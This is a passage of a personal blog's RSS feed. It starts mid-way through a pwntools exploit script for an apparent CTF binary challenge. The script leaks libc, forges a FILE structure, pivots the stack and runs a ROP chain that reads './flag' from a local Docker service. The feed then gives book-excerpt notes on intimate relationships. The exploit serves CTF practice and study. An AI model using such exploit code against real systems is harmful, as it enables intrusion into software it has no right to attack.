:p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(delim, data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;lgaddr  = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    &#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;host.docker.internal&amp;#34;,9999 )&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;def add(offset, content):&#xA;    &amp;#34;&amp;#34;&amp;#34;调用 add 函数&#xA;    offset: 偏移量（可以是负数或大于 0x20 的值，利用检查漏洞）&#xA;    content: 要写入的内容&#xA;    &amp;#34;&amp;#34;&amp;#34;&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;, b&amp;#39;1&amp;#39;)&#xA;    p.sendlineafter(b&amp;#39;Please input the offset:\n&amp;#39;, str(offset).encode())&#xA;    p.sendafter(b&amp;#39;Please input the Content:\n&amp;#39;, content)&#xA;&#xA;def show():&#xA;    &amp;#34;&amp;#34;&amp;#34;调用 show 函数&amp;#34;&amp;#34;&amp;#34;&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;, b&amp;#39;2&amp;#39;)&#xA;&#xA;show()&#xA;libc_base = r64() - 0x282e50 - 0x10000&#xA;lg(&amp;#34;libc_base&amp;#34;)&#xA;&#xA;&#xA;#    0x7ffff7c49503 &amp;lt;longjmp&amp;#43;11&amp;gt;: mov    rbx,QWORD PTR [rdi]&#xA;#    0x7ffff7c49506 &amp;lt;longjmp&amp;#43;14&amp;gt;: mov    rbp,QWORD PTR [rdi&amp;#43;0x8]&#xA;#    0x7ffff7c4950a &amp;lt;longjmp&amp;#43;18&amp;gt;: mov    r12,QWORD PTR [rdi&amp;#43;0x10]&#xA;#    0x7ffff7c4950e &amp;lt;longjmp&amp;#43;22&amp;gt;: mov    r13,QWORD PTR [rdi&amp;#43;0x18]&#xA;#    0x7ffff7c49512 &amp;lt;longjmp&amp;#43;26&amp;gt;: mov    r14,QWORD PTR [rdi&amp;#43;0x20]&#xA;#    0x7ffff7c49516 &amp;lt;longjmp&amp;#43;30&amp;gt;: mov    r15,QWORD PTR [rdi&amp;#43;0x28]&#xA;#    0x7ffff7c4951a &amp;lt;longjmp&amp;#43;34&amp;gt;: mov    rdx,QWORD PTR [rdi&amp;#43;0x30]&#xA;#    0x7ffff7c4951e &amp;lt;longjmp&amp;#43;38&amp;gt;: mov    rsp,rdx&#xA;# =&amp;gt; 0x7ffff7c49521 &amp;lt;longjmp&amp;#43;41&amp;gt;: mov    rdx,QWORD PTR [rdi&amp;#43;0x38]&#xA;#    0x7ffff7c49525 &amp;lt;longjmp&amp;#43;45&amp;gt;: jmp    rdx&#xA;libc.address = libc_base&#xA;magic_gadget = libc_base &amp;#43; 0x49503&#xA;pop_rdi_ret = libc_base &amp;#43; 0x14862&#xA;pop_rsi_ret = libc_base &amp;#43; 0x1c237&#xA;pop_rdx_ret = libc_base &amp;#43; 0x1bea2&#xA;pop_rax_ret = libc_base &amp;#43; 0x1b826&#xA;ret = libc_base &amp;#43; 0xcdc&#xA;fake_file_addr = libc_base &amp;#43; 0x292200&#xA;libc_end_addr = libc_base &amp;#43; 0x296000&#xA;stdin_addr = libc_base &amp;#43; 0x292200&#xA;stdout_addr = libc_base &amp;#43; 0x292300&#xA;rop_addr = libc_base &amp;#43; 0x292430&#xA;&#xA;stdout_struct = (&#xA;    p64(0x45) &amp;#43;                    # &amp;#43;0x00&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x08&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x10&#xA;    p64(libc_base &amp;#43; 0x4a957) &amp;#43;     # &amp;#43;0x18&#xA;    p64(libc_base &amp;#43; 0x39a8) &amp;#43;  # &amp;#43;0x20&#xA;    p64(libc_base &amp;#43; 0x39a8) &amp;#43;  # &amp;#43;0x28&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x30&#xA;    p64(libc_base &amp;#43; 0x39a8) &amp;#43;  # &amp;#43;0x38&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x40&#xA;    p64(libc_base &amp;#43; 0x4aac3) &amp;#43;     # &amp;#43;0x48&#xA;    p64(libc_base &amp;#43; 0x4aabb) &amp;#43;     # &amp;#43;0x50&#xA;    p64(libc_base &amp;#43; 0x39a8) &amp;#43;  # &amp;#43;0x58&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x60&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x68&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x70&#xA;    p64(0x1) &amp;#43;                     # &amp;#43;0x78&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x80&#xA;    p64(0xffffffffffffffff) &amp;#43;      # &amp;#43;0x88&#xA;    p64(0xffffffff) &amp;#43;              # &amp;#43;0x90&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0x98&#xA;    p64(0x0) &amp;#43;                     # &amp;#43;0xA0&#xA;    p64(0x0)                       # &amp;#43;0xA8&#xA;)&#xA;stdout_struct = stdout_struct.ljust(0xf0, b&amp;#39;\x00&amp;#39;)&#xA;&#xA;&#xA;#0x85&#xA;rop = b&amp;#39;&amp;#39;&#xA;# rop &amp;#43;= p64(pop_rdi_ret)&#xA;# rop &amp;#43;= p64(fake_file_addr) #flag&#xA;rop &amp;#43;= p64(pop_rsi_ret)&#xA;rop &amp;#43;= p64(0)&#xA;rop &amp;#43;= p64(libc.sym[&amp;#39;open&amp;#39;])&#xA;&#xA;rop &amp;#43;= p64(pop_rdi_ret)&#xA;rop &amp;#43;= p64(3)&#xA;rop &amp;#43;= p64(pop_rsi_ret)&#xA;rop &amp;#43;= p64(libc_end_addr-0x100)&#xA;rop &amp;#43;= p64(pop_rdx_ret)&#xA;rop &amp;#43;= p64(0x100)&#xA;rop &amp;#43;= p64(libc.sym[&amp;#39;read&amp;#39;])&#xA;&#xA;rop &amp;#43;= p64(pop_rdi_ret)&#xA;rop &amp;#43;= p64(1)&#xA;rop &amp;#43;= p64(pop_rsi_ret)&#xA;rop &amp;#43;= p64(libc_end_addr-0x100)&#xA;rop &amp;#43;= p64(pop_rdx_ret)&#xA;rop &amp;#43;= p64(0x100)&#xA;rop &amp;#43;= p64(libc.sym[&amp;#39;write&amp;#39;])&#xA;&#xA;fake_file = b&amp;#34;&amp;#34;&#xA;fake_file &amp;#43;= b&amp;#34;./flag&amp;#34;.ljust(8, b&amp;#39;\x00&amp;#39;)  # flags&#xA;fake_file &amp;#43;= p64(0)  # rpos rbp&#xA;fake_file &amp;#43;= p64(0)  # rend r12&#xA;fake_file &amp;#43;= p64(0)  # close r13&#xA;fake_file &amp;#43;= p64(0)  # wend r14&#xA;fake_file &amp;#43;= p64(0)  # wpos r15&#xA;fake_file &amp;#43;= p64(rop_addr)  # mustbezero_1 rdx rsp&#xA;fake_file &amp;#43;= p64(ret)  # wbase rip&#xA;fake_file &amp;#43;= p64(0)  # read&#xA;fake_file &amp;#43;= p64(magic_gadget)  # write&#xA;fake_file = fake_file.ljust(0xf0, b&amp;#39;\x00&amp;#39;)  # lock = 0&#xA;&#xA;pl = p64(0)*4&#xA;pl &amp;#43;=  fake_file &amp;#43; p64(0)*2&#xA;pl&amp;#43;=  stdout_struct&#xA;pl &amp;#43;= b&amp;#34;\x00&amp;#34;*0x40&#xA;pl &amp;#43;= rop&#xA;# dbg()&#xA;add(-0x30e0-0x100,pl)&#xA;&#xA;# 0x0000000000025b40 : push rax ; ret&#xA;&#xA;&#xA;itr()&#xA;# b *0x7ffff7c00000&amp;#43;0x49503&#xA;# stdin dq 0x00007ffff7e92200 32 &#xA;# bbase 0xa9f&#xA;# sbase 0x201FE0&#xA;# 0x781e1ce953c0&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>《亲密关系》</title>
      <link>http://localhost:1313/posts/read_qmgx/</link>
      <pubDate>Thu, 23 Oct 2025 23:55:44 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_qmgx/</guid>
      <category domain="http://localhost:1313/categories/reading/">Reading</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;摘录&#34;&gt;&lt;span&gt;摘录&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%91%98%e5%bd%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;应警惕的观点：伴侣是不会发生改变的。一旦亲密关系变糟，就无法得到改善。如果爱人曾伤害过你，毫无疑问还会一而再，再而三地伤害你。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;持有成长信念的人还能心平气和地讨论爱人的缺点；相形之下，持有宿命信念的人一谈到伴侣的缺陷就充满敌意&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人们究竟要怎样才能与爱恋自己的人快乐相处呢？1.建立对伴侣善意和大度的认知，突出他们的美德而缩小他们的缺陷&#xA;2.随着对伴侣了解程度的增加，不断调整自己对理想伴侣的期望&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;对他人的期望能引导我们对他人做出的行为反应，所以期望具有促动作用&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;找到你生命中的真爱并不能让你永远幸福。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;&lt;ul&gt;&#xA;&lt;li&gt;自主(autonomy)：允许你的伴侣在亲密关系之外还能拥有自己的朋友和兴趣爱好；不要有太强的占有欲。(37%)&lt;/li&gt;&#xA;&lt;li&gt;相似(similarity)：你和伴侣应该有相似的态度、价值观和兴趣；差别不要太大。(30%)&lt;/li&gt;&#xA;&lt;li&gt;支持(supportiveness)：提升伴侣的自我价值和自尊；不要粗枝大叶或不够体贴。(27%)&lt;/li&gt;&#xA;&lt;li&gt;开放(openness)：真诚而又真实地进行自我表露；不要什么都不说。(22%)&lt;/li&gt;&#xA;&lt;li&gt;忠诚(fidelity)：对你的伴侣保持忠诚；不要出轨。(17%)&lt;/li&gt;&#xA;&lt;li&gt;共处(togetherness)：一起分享大量的时间；尽量不要上夜班或搬到外地，不要在其他地方花太多时间。(16%)&lt;/li&gt;&#xA;&lt;li&gt;公平(equity)：秉持公正与公平；不要利用和剥削你的伴侣。(12%)&lt;/li&gt;&#xA;&lt;li&gt;魔力(magic)：保持浪漫；拒绝平淡。(10%)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;翻来覆去的反刍思维(rumination)只会延长我们的痛苦，而反省（即找寻经历中的意义并期望从中学习）则与积极的调适和恢复有关(Saffrey &amp;amp; Ehrenberg, 2007)&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;为了忘掉前任，他们可以着手浏览约会网站，看看那里都有些什么样的人；焦虑的人把目光投向新朋友，反倒更容易从失败的亲密关系中走出来(Spielmann et al., 2009)。但是，任何人都不应该再去浏览前任的社交网络上的主页；人们用于查看前任主页上的时间越多，其感情创伤愈合并开始新生活所需的时间就越长&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;与那些父母仍维持婚姻的孩子相比，父母离异的孩子在青少年期和成年早期的幸福感都较低。他们的心理适应能力相对低下，体验到更多的抑郁和焦虑，对生活的满意度较低。他们的问题行为更多，如吸毒、违法、少女怀孕、学业不良等问题更为严重。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;如果孩子生活在持续发生冲突的家庭，父母不离婚则会使他们的情况更糟糕&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;当和平的婚姻破裂时，孩子就会受到伤害；如果家庭充满冲突，则离婚倒会让孩子的境况变得更好&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;如果子女能够免于贫困，得到充满关爱的、可靠的和一致的养育，并远离父母冲突带来的伤害，他们就能快乐地成长&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人们通常期望男性具有果断自信、自强自立而非温情脉脉、温柔体贴的行为风格，而这种行为风格并不能将他们培养成长期亲密关系中非常理想的伴侣&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;临近、熟识和方便是决定具有奖赏价值的亲密关系能否开始的重要因素。可能我们与许多人都能建立美满的亲密关系，只不过我们与他们永远不会相遇&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们并不像自己以为的那样了解或理解自己的伴侣；即使在成功的亲密关系中，仍存在很多误解&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;从长远来看，亲密关系的代价往往比我们预期的要大得多。如果你认为你的亲密关系将带给你源源不断的幸福和喜悦，你肯定会失望&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;约三分之一的人不能轻松舒适地对待相互依赖的亲密感；他们要么担心伴侣不够爱自己，要么在伴侣太亲近时感觉不自在&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;幸福的恋人宽容地看待自己的伴侣及其行为，在有疑问时选择相信伴侣，即使伴侣偶尔行为不当，也仍然认为他们是善良体贴的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在幸福的亲密关系中，当激情减退时，取而代之的是一种深厚、饱含感情的友谊，这种友谊对身处其中的人来说丰富、温暖且令人满意。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;也许最重要的是，如果我们努力，几乎所有人都能成为更体贴、更有魅力、更有价值的伴侣。当男性有动力进行非言语沟通时，他们会在这方面做得更好。如果我们能花时间检查自己理解的准确性，就能减少或消除言语上的误解。只要用心去做，我们就可以在对待伴侣时更礼貌、更无私、更体贴、更少挑剔。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;对一段伴侣关系做出承诺、希望并期望这段关系继续下去的人，其思维和行为方式都不同于承诺较少的伴侣(Ogolsky &amp;amp; Bowers, 2013)。当他们预见到与伴侣未来的幸福生活时(Lemay, 2016)，他们会以有助于维系伴侣关系的方式看待自己、伴侣及双方关系，并且以能够避免或化解冲突、充实亲密关系的方式行事。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;</description>
    </item>
    <item>
      <title>《人生的智慧》</title>
      <link>http://localhost:1313/posts/read_rsdzh/</link>
      <pubDate>Thu, 23 Oct 2025 23:40:32 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_rsdzh/</guid>
      <category domain="http://localhost:1313/categories/reading/">Reading</category>
